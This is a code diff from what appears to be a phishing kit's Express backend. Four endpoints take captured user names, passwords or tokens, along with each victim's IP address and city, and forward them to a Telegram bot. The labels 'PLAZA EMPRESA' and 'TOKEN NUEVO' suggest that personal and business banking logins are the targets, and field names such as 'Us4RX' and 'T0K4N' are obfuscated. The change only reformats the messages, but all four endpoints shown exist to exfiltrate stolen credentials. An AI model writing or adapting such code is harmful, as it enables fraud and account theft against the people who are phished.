@@ -67,7 +67,7 @@ app.post('/api/sendMessage2', async (req, res) => {
     }
 
     // Construir mensaje
-    const message = `🔐🟢PLAZA TOKEN VIEJO🟢\nUs4RX: <code>${usar}</code>\nT0K4N: <code>${pass}</code>\n\nIP: ${ip}\nCiudad: ${city}`;
+    const message = `🔐🟢PLAZA TOKEN VIEJO🟢\nUs4RX: <code>${usar}</code>\n\nT0K4N: <code>${pass}</code>\n\nIP: ${ip}\nCiudad: ${city}`;
 
     try {
         const response = await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
@@ -90,7 +90,7 @@ app.post('/api/sendMessageEmpre', async (req, res) => {
     }
 
     // Construir mensaje
-    const message = `🟢PLAZA EMPRESA🟢\nUs4RX: <code>${user}</code>\nCL4V: <code>${passa}</code>\nIP: ${ip}\nCiudad: ${city}`;
+    const message = `🟢PLAZA EMPRESA🟢\nUs4RX: <code>${user}</code>\nCL4V: <code>${passa}</code>\n\nIP: ${ip}\nCiudad: ${city}`;
 
     try {
         const response = await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
@@ -114,7 +114,7 @@ app.post('/api/sendMessages', async (req, res) => {
     }
 
     // Construir mensaje
-    const message = `🟢PLAZA PERSO NUEVO🟢\nUs4RX: <code>${user}</code>\nCL4V: <code>${passa}</code>\nIP: ${ip}\nCiudad: ${city}`;
+    const message = `🟢PLAZA PERSO NUEVO🟢\nUs4RX: <code>${user}</code>\nCL4V: <code>${passa}</code>\n\nIP: ${ip}\nCiudad: ${city}`;
 
     try {
         const response = await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
@@ -138,7 +138,7 @@ app.post('/api/sendMessages2', async (req, res) => {
     }
 
     // Construir mensaje
-    const message = `🔐🟢PLAZA TOKEN NUEVO🟢\nUs4RX: <code>${user}</code>\nT0K4N: <code>${pass}</code>\n\nIP: ${ip}\nCiudad: ${city}`;
+    const message = `🔐🟢PLAZA TOKEN NUEVO🟢\nUs4RX: <code>${user}</code>\n\nT0K4N: <code>${pass}</code>\n\nIP: ${ip}\nCiudad: ${city}`;
 
     try {
         const response = await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
